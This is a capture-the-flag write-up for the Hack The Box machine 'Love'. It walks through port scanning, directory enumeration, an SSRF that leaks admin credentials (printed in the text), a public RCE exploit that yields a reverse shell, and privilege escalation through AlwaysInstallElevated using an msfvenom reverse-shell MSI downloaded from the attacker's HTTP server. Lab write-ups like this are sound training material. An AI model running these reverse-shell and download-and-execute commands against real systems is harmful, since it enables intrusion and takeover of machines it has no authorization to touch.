# [Love](https://app.hackthebox.com/machines/love)

```bash
nmap -p- --min-rate 10000  10.10.10.239 -Pn  
```

![Alt text](img/image.png)


As I know open ports, let's do greater scan for these ports.

```bash
nmap -A -sC -sV -p80,135,139,443,445,3306,5000 10.10.10.239 -Pn 
```
![Alt text](img/image-2.png)


From port (443), https, we can see **'staging.love.htb'**

Let's add this ip address into '/etc/hosts' file.

![Alt text](img/image-1.png)


Let's do directory enumeration for 'staging.love.htb'

```bash
gobuster dir -u http://staging.love.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 40 -x php
```

![Alt text](img/image-3.png)


Let's browse the page.


![Alt text](img/image-4.png)


Let's check functionality of this page.

![Alt text](img/image-5.png)

![Alt text](img/image-6.png)


We can add localhost also to this page, I add port 5000 as because from nmap result I see that on port 5000 is HTTP service running.

![Alt text](img/image-7.png)

![Alt text](img/image-8.png)

I grab admin credentials of 'VoteAdmin' service which is running for port 80.

admin: @LoveIsInTheAir!!!! 


I also did directory enumeration for 'love.htb'

```bash
gobuster dir -u http://love.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 40
```

![Alt text](img/image-9.png)


Now we can see '/admin' page with credentials which I took before.

![Alt text](img/image-10.png)


Let's search publicly known RCE for 'VotingSystem'.

![Alt text](img/image-11.png)


![Alt text](img/image-12.png)


I changed source code of exploit.

![Alt text](img/image-13.png)


I got reverse shell.

![Alt text](img/image-14.png)

user.txt

![Alt text](img/image-15.png)


For enumeration of Windows machine, I just check 'AlwaysInstallElevated' section via below command.


```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![Alt text](img/image-16.png)


While this option is set true (value=1)

Let's generate `.msi` file via `msfvenom` tool.

```bash
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=1338 -f msi -o dr4ks.msi
```

![Alt text](img/image-17.png)

Let's open HTTP server and upload malicious reverse shell file into machine.

```bash
python3 -m http.server --bind 10.10.14.9 8080
```

![Alt text](img/image-18.png)

```bash
powershell wget http://10.10.14.9:8080/dr4ks.msi -outfile dr4ks.msi
```

![Alt text](img/image-19.png)


Now, execute this maliciois `.msi` file.

```bash
msiexec /quiet /qn /i dr4ks.msi
```


I got administrative shell.

![Alt text](img/image-20.png)


root.txt

![Alt text](img/image-21.png)